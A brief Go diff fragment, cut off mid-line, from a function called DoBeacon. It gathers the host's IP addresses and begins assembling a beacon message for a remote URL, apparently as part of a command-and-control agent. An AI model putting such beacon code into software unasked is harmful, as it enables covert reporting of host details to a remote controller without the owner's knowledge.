@@ -36,4 +36,11 @@ func DoBeacon(url string) ([]byte, error) {
 			case *net.IPNet:
 				ip = v.IP
 			case *net.IPAddr:
-				ip =
+				ip = v.IP
+			}
+			ips = append(ips, ip.String())
+		}
+	}
+
+	// build beacon
+	mybeacon := communication.Beacon{Ho
